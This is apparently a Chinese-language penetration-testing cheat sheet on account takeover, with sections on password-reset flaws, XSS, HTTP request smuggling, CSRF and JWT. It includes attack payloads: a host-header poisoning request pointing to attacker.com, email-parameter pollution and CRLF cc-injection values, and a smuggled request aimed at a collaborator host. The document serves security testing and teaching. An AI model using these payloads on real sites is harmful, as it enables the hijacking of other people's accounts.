# 账户劫持 (Account Takeover)

> 账户劫持(ATO)是网络安全领域中的重大威胁，涉及通过多种攻击向量获取用户账户的未授权访问。

## 目录

* [密码重置功能](#密码重置功能)
    * [通过Referrer泄露密码重置令牌](#通过referrer泄露密码重置令牌)
    * [通过密码重置投毒实现账户劫持](#通过密码重置投毒实现账户劫持)
    * [通过Email参数重置密码](#通过email参数重置密码)
    * [API参数中的IDOR漏洞](#api参数中的idor漏洞)
    * [弱密码重置令牌](#弱密码重置令牌)
    * [泄露密码重置令牌](#泄露密码重置令牌)
    * [通过用户名冲突重置密码](#通过用户名冲突重置密码)
    * [Unicode规范化问题导致的账户劫持](#unicode规范化问题导致的账户劫持)
* [通过Web漏洞实现账户劫持](#通过web漏洞实现账户劫持)
    * [通过跨站脚本(XSS)实现账户劫持](#通过跨站脚本xss实现账户劫持)
    * [通过HTTP请求走私实现账户劫持](#通过http请求走私实现账户劫持)
    * [通过CSRF实现账户劫持](#通过csrf实现账户劫持)
    * [通过JWT实现账户劫持](#通过jwt实现账户劫持)
* [参考资料](#参考资料)

## 密码重置功能

### 通过Referrer泄露密码重置令牌

1. 向您的邮箱请求密码重置
2. 点击密码重置链接
3. 不要更改密码
4. 点击任何第三方网站（如：Facebook、Twitter）
5. 在Burp Suite代理中拦截请求
6. 检查referer头是否泄露了密码重置令牌

### 通过密码重置投毒实现账户劫持

1. 在Burp Suite中拦截密码重置请求
2. 在Burp Suite中添加或编辑以下请求头：`Host: attacker.com`，`X-Forwarded-Host: attacker.com`
3. 转发修改后的请求

    ```http
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: attacker.com
    ```

4. 查找基于*host header*的密码重置URL，例如：`https://attacker.com/reset-password.php?token=TOKEN`

### 通过Email参数重置密码

```powershell
# 参数污染
email=victim@mail.com&email=hacker@mail.com

# 邮件数组
{"email":["victim@mail.com","hacker@mail.com"]}

# 抄送
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# 分隔符
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### API参数中的IDOR漏洞

1. 攻击者需要登录自己的账户并进入**更改密码**功能
2. 启动Burp Suite并拦截请求
3. 发送到Repeater标签页并编辑参数：用户ID/邮箱

    ```powershell
    POST /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
    ```

### 弱密码重置令牌

密码重置令牌应随机生成且每次唯一。尝试确定令牌是否会过期，或者是否始终相同。在某些情况下，生成算法可能很弱，可以被猜测。算法可能使用以下变量：

* 时间戳
* 用户ID
* 用户邮箱
* 名和姓
* 出生日期
* 加密方式
* 仅数字
* 短令牌序列（<6个字符，包含[A-Z,a-z,0-9]）
* 令牌重用
* 令牌过期日期

### 泄露密码重置令牌

1. 使用API/UI为特定邮箱触发密码重置请求，例如：<test@mail.com>
2. 检查服务器响应，查找`resetToken`
3. 在URL中使用该令牌，例如：`https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### 通过用户名冲突重置密码

1. 使用与受害者用户名相同但前后插入空格的用户名注册系统。例如：`"admin "`
2. 使用恶意用户名请求密码重置
3. 使用发送到您邮箱的令牌重置受害者密码
4. 使用新密码登录受害者账户

CTFd平台曾存在此漏洞。
参考：[CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Unicode规范化问题导致的账户劫持

当处理涉及Unicode的输入以进行大小写映射或规范化时，可能会出现意外行为。

* 受害者账户：`demo@gmail.com`
* 攻击者账户：`demⓞ@gmail.com`

[Unisub - 可以建议可能转换为给定字符的Unicode字符的工具](https://github.com/tomnomnom/hacks/tree/master/unisub)。

[Unicode渗透测试速查表](https://gosecure.github.io/unicode-pentester-cheatsheet/)可用于根据平台查找适合的Unicode字符列表。

## 通过Web漏洞实现账户劫持

### 通过跨站脚本(XSS)实现账户劫持

1. 在应用程序或子域中查找XSS漏洞（如果cookie作用域为父域：`*.domain.com`）
2. 泄露当前**会话cookie**
3. 使用该cookie以用户身份进行身份验证

### 通过HTTP请求走私实现账户劫持

参考**HTTP请求走私**漏洞页面。

1. 使用**smuggler**检测HTTP请求走私类型（CL、TE、CL.TE）

    ```powershell
    git clone https://github.com/defparam/smuggler.git
    cd smuggler
    python3 smuggler.py -h
    ```

2. 制作一个请求，该请求将覆盖`POST / HTTP/1.1`为以下数据：

    ```powershell
    GET http://something.burpcollaborator.net  HTTP/1.1
    X: 
    ```

3. 最终请求可能如下所示：

    ```powershell
    GET /  HTTP/1.1
    Transfer-Encoding: chunked
    Host: something.com
    User-Agent: Smuggler/v1.0
    Content-Length: 83

    0

    GET http://something.burpcollaborator.net  HTTP/1.1
    X: X
    ```

Hackerone上利用此漏洞的报告：

* <https://hackerone.com/reports/737140>
* <https://hackerone.com/reports/771666>

### 通过CSRF实现账户劫持

1. 创建CSRF负载，例如："带自动提交的HTML表单用于更改密码"
2. 发送负载

### 通过JWT实现账户劫持

JSON Web Token可能用于用户认证。

* 使用另一个用户ID/邮箱编辑JWT
* 检查弱JWT签名

## 参考资料

* [$6.5k + $5k HTTP请求走私大规模账户劫持 - Slack + Zomato - 漏洞赏金报告解析 - 2020年8月30日](https://www.youtube.com/watch?v=gzM4wWA7RFo)
* [10种密码重置漏洞 - Anugrah SR - 2020年9月16日](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
* [加密漏洞与账户劫持 - Harsh Bothra - 2020年9月20日](https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
* [CTFd账户劫持 - NIST国家漏洞数据库 - 2020年3月29日](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
* [通过复制粘贴入侵Grindr账户 - Troy Hunt - 2020年10月3日](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)

---

*最后更新: 2025年6月*
